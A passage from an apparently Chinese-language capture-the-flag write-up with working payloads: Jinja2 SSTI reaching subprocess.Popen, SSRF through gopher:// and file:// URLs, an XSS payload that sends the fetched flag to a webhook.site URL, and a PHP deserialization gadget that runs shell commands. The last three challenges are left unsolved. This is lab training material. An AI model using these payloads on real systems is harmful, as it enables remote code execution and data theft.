'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'uwsgi._Input'>, <class 'uwsgi.SymbolsImporter'>, <class 'uwsgi.ZipImporter'>, <class 'uwsgi.SymbolsZipImporter'>, <class '_ast.AST'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'typing._Final'>, <class 'typing._Immutable'>, <class 'typing.Generic'>, <class 'typing._TypingEmpty'>, <class 'typing._TypingEllipsis'>, <class 'typing.NamedTuple'>, <class 'typing.io'>, <class 'typing.re'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class '_random.Random'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'Struct'>, <class 'unpack_iterator'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'dis.Bytecode'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'werkzeug.sansio.multipart.Event'>, <class 'werkzeug.sansio.multipart.MultipartDecoder'>, <class 'werkzeug.sansio.multipart.MultipartEncoder'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'hmac.HMAC'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.user_agent.UserAgent'>, <class 'werkzeug.useragents._UserAgentParser'>, <class 'werkzeug.sansio.request.Request'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.sansio.response.Response'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'numbers.Number'>, <class 'ast.NodeVisitor'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local._ProxyLookup'>, <class 'werkzeug.local.LocalProxy'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'gettext.NullTranslations'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.scaffold.Scaffold'>, <class 'itsdangerous._json._CompactJSON'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.blueprints.BlueprintSetupState'>, <class '__future__._Feature'>, <class 'unicodedata.UCD'>]
```

> <class 'subprocess.Popen'>
> {{ ().__ class__.__ base__.__ subclasses__()[283] }}

![image](https://hackmd.io/_uploads/H1tPT1qL6.png)
> {{ ().__ class__.__ base__.__ subclasses__()[283] ('ls',shell=True,stdout=-1).communicate()[0].strip()}}

![image](https://hackmd.io/_uploads/ryxr0kq8T.png)
> {{ ().__ class__.__ base__.__ subclasses__()[283]('ls ..',shell=True,stdout=-1).communicate()[0].strip()}}
> {{ ().__ class__.__ base__.__ subclasses__()[283]('cat ../th1s_15_fl4ggggggg',shell=True,stdout=-1).communicate()[0].strip()}}

![image](https://hackmd.io/_uploads/SJsp1eqLT.png)

### Get Flag
> **FLAG{ssti.__class__.__pwn__}**

# SSRF
## Web Preview Card
![image](https://hackmd.io/_uploads/SJymvkjIa.png)
http://h4ck3r.quest:8500/ \
![image](https://hackmd.io/_uploads/Sy6ED1jLa.png)
> http://h4ck3r.quest:8500/preview.php?url=https://example.com/

![image](https://hackmd.io/_uploads/r1wcwkj8T.png)

### Web Preview Card Solution
Source Code
```html=
<!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
        
    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 2em;
        background-color: #fdfdff;
        border-radius: 0.5em;
        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        div {
            margin: 0 auto;
            width: auto;
        }
    }
    </style>    
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.</p>
    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>
```
> google.com

![image](https://hackmd.io/_uploads/BkIsP_TIT.png)
> ![image](https://hackmd.io/_uploads/HkqSIN95T.png)
> file:///var/www/html/flag.php

![image](https://hackmd.io/_uploads/B1hEjdTLa.png)
> $_POST['givemeflag'] === 'yes'

> gopher://h4ck3r.quest:8500/_GET /flag.php HTTP/1.1\r\n Host:127.0.0.1 \r\n\r\n
> 
> gopher://h4ck3r.quest:8500/_GET%20/flag.php%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0A%0D%0A

![image](https://hackmd.io/_uploads/Hkk5q_pIT.png)

ADD Cookie: Content-Length: 14 Content-Type: application/x-www-form-urlencoded Connection: close givemeflag=yes
> gopher://h4ck3r.quest:8500/_POST /flag.php HTTP/1.1\r\n Host:127.0.0.1\r\nContent-Length: 14\r\nContent-Type: application/x-www-form-urlencoded Connection: close\r\n\r\ngivemeflag=yes
>
>gopher://h4ck3r.quest:8500/_POST%20/flag.php%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0AContent-Length:%2014%0D%0AContent-Type:%20application%2Fx-www-form-urlencoded%20Connection:%20close%0D%0A%0D%0Agivemeflag%3Dyes

![image](https://hackmd.io/_uploads/HJP0bYTLT.png)

### Get Flag
> **FLAG{gopher://http_post}**

# Frontend
## XSS Me
![image](https://hackmd.io/_uploads/BkUDLKpL6.png)
http://h4ck3r.quest:8800/

![image](https://hackmd.io/_uploads/H1CdIYpU6.png)

### XSS Me Solution
#### 1. guest/guest 登入

![image](https://hackmd.io/_uploads/r1V6ItTL6.png)

#### 2. 向admin回報錯誤

http://h4ck3r.quest:8800/report
![image](https://hackmd.io/_uploads/HkYfDYp8p.png)
>  https://google.com

![image](https://hackmd.io/_uploads/Sy85PY6Up.png)

#### 3.  chw/chw 登入
http://h4ck3r.quest:8800/?type=error&message=User%20not%20found.
![image](https://hackmd.io/_uploads/HJ0MxXc9a.png)
測試message: http://h4ck3r.quest:8800/?type=error&message=chw
![image](https://hackmd.io/_uploads/HkkneQq9a.png)

```html
<script>
	const message = {"icon": "error", "titleText": "chw", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true};
	window.onload = function () {
		if (message !== null) Swal.fire(message);
	}
</script>
```
#### 4. script 閉合
http://h4ck3r.quest:8800/?type=error&message=chw</script>
![image](https://hackmd.io/_uploads/rJ9GfX9q6.png)
![image](https://hackmd.io/_uploads/S1eEzm9c6.png)

### XSS payload
找到可以XSS的洞後，注入Javascript。 [● Javascript Fetch用法](https://www.oxxostudio.tw/articles/201908/js-fetch.html)
使用fetch()發送GET request到/getflag。 
Response 以text 格式回傳，並且href至指定的Webhook URL。後面皆註解調。
```
http://h4ck3r.quest:8800/?type=error&message=chw</script><script>fetch('/getflag').then(r=>r.text()).then(flag=>location.href='https://webhook.site/2f40d0b6-155b-4687-8437-1738ad0deb32/?${flag}')//
```
![image](https://hackmd.io/_uploads/rJAEqQc5a.png)
![image](https://hackmd.io/_uploads/SkkR9m956.png)

> Webhook 成功收到請求。

#### 送至"向admin回報錯誤"
500 INTERNAL SERVER ERROR
伺服器往生中..

# Deserialization

## Magic Cat 
![image](https://hackmd.io/_uploads/BkOya3jD6.png)
http://h4ck3r.quest:8602/
![image](https://hackmd.io/_uploads/BJ8-T3swT.png)
### Magic Cat Solution
Source Code: http://h4ck3r.quest:8602/?source
```php=
<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Magic
{
    function cast($spell)
    {
        echo "<script>alert('MAGIC, $spell!');</script>";
    }
}

// Useless class?
class Caster
{
    public $cast_func = 'intval';
    function cast($val)
    {
        return ($this->cast_func)($val); #Class Cat 變更後，取得 $val 就成功了
    }
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Magic();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell); #更改目標 (-> Caster)
    }
}

if (isset($_GET['spell'])) {
    $cat = new Cat($_GET['spell']);
} else if (isset($_COOKIE['cat'])) {
    echo "Unserialize...\n";
    $cat = unserialize(base64_decode($_COOKIE['cat']));
} else {
    $cat = new Cat("meow-meow-magic");
}
?>
<pre>
This is your 🐱:
<?php var_dump($cat) ?>
</pre>

<p>Usage:</p>
<p>/?source</p>
<p>/?spell=the-spell-of-your-cat</p>

```
> Function 原本指向Magic，目標指向Caster
> 控制到class Caster: return ($ this->cast_func)($val); 就成功了

#### Create serialized Cookie
```php=
<?php

class Caster
{
    public $cast_func = 'system';  //改成system function
    //function cast($val)
    //{
    //    return ($this->cast_func)($val);
    //}
}


class Cat
{
    public $magic;
    public $spell;
    function __construct()
    {
        $this->magic = new Caster(); //Magic改成指向 Caster
        $this->spell = 'whoami'; // $spell 
    }
    //function __wakeup()
    //{
    //    echo "Cat Wakeup!\n";
    //    $this->magic->cast($this->spell); //會指向magic(已改成 Caster()) & $this->spell 會傳進 Caster()
    //}
}
echo base64_encode(serialize(new Cat()))
?>

```
> TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjY6Indob2FtaSI7fQ==

#### Insert Cookie
![image](https://hackmd.io/_uploads/BJj0sofOa.png)

http://h4ck3r.quest:8602/
![image](https://hackmd.io/_uploads/B1hM3sfup.png)

> Unserialize... Cat Wakeup! www-data
> 成功觸發 wakeup()

#### cat /f*
```php=
class Cat
{
    public $magic;
    public $spell;
    function __construct()
    {
        $this->magic = new Caster();
        $this->spell = 'cat /f*';
    }
    //function __wakeup()
    //{
    //    echo "Cat Wakeup!\n";
    //    $this->magic->cast($this->spell);
    //}
}
```
產出 serialize base64 encode
> TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjc6ImNhdCAvZioiO30=

![image](https://hackmd.io/_uploads/BJOlg2zOa.png)
### Get Flag
> **FLAG{magic_cat_pwnpwn}**

# Language Feature

## PHP Login
![image](https://hackmd.io/_uploads/SyqCcKhoT.png)
http://h4ck3r.quest:8081/
拒絕連線
### PHP Login Solution

## JS Login
![image](https://hackmd.io/_uploads/S1pmiYnjT.png)
http://h4ck3r.quest:8082/
拒絕連線
### JS Login Solution

## WTFPHP
![image](https://hackmd.io/_uploads/BJuYiKniT.png)
http://h4ck3r.quest:8080
拒絕連線
### WTFPHP Solution
